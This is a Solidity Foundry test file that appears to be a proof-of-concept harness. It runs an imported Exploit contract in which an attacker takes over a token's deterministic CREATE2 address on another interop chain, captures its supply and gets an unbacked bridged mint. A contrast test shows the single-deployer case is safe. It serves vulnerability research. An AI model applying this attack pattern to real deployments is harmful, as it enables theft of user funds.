// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./50077-malicious-tokens-can-be-deployed-at-deterministic-addresses.sol";

/// @notice Thin forge-std driver for the cheatcode-free synthetic. Runs the Exploit and
///         re-asserts the harm by reading public state / ERC20 balances.
contract MaliciousDeterministicTokenTest is Test {
    /// @notice HARM: the attacker controls the canonical (honest-expected) token address,
    ///         capturing the 100M initialize() supply AND receiving an unlimited unbacked
    ///         mint through the trusting bridge.
    function test_exploit() public {
        Exploit e = new Exploit();
        e.run();

        SuperchainUSDC token = SuperchainUSDC(e.canonicalToken());
        address atk = address(e.attacker());

        // Deployer-independence: the attacker deployed identical code at the very address the
        // honest project pre-computed for itself.
        assertEq(e.attackerDeployed(), e.canonicalToken(), "token address must be deployer-independent");

        // Attacker captured the initial supply and the unbacked bridged mint on the legit token.
        uint256 expected = e.INITIAL_SUPPLY() + e.BRIDGED_AMOUNT();
        assertEq(token.balanceOf(atk), expected, "attacker balance on canonical token");
        assertEq(token.totalSupply(), expected, "total supply is fully attacker-controlled");
        assertGt(token.balanceOf(atk), 0);

        // The honest side holds nothing at the address it expected to own.
        assertEq(token.balanceOf(e.HONEST_SENDER()), 0, "honest holds nothing");

        emit log_named_decimal_uint("Attacker USDC on canonical addr (unbacked)", token.balanceOf(atk), 18);
    }

    /// @notice CONTRAST: absent an adversary racing on another chain, the SAME mechanism is
    ///         safe. The honest sole deployer initializes first and owns the supply; a second
    ///         initialize on the SAME chain reverts. The vulnerability is that on a DIFFERENT
    ///         interop chain the attacker gets a fresh, uninitialized token at the same address.
    function test_honestSoleDeployment_isSafe() public {
        Create2Factory factory = new Create2Factory();
        SuperchainTokenBridge bridge = new SuperchainTokenBridge(address(this));
        bytes memory initCode = abi.encodePacked(type(SuperchainUSDC).creationCode, abi.encode(address(bridge)));
        bytes32 salt = bytes32(uint256(1));

        address predicted = factory.computeAddress(salt, keccak256(initCode));
        address deployed = factory.deploy(0, salt, initCode);
        assertEq(deployed, predicted, "CREATE2 address is deterministic");

        SuperchainUSDC token = SuperchainUSDC(deployed);
        token.initialize(); // honest (this test contract) initializes first
        assertEq(token.balanceOf(address(this)), 100_000_000e18, "honest owns the supply");

        // On the SAME chain a second initialize is blocked...
        vm.expectRevert(bytes("already initialized"));
        token.initialize();
    }
}
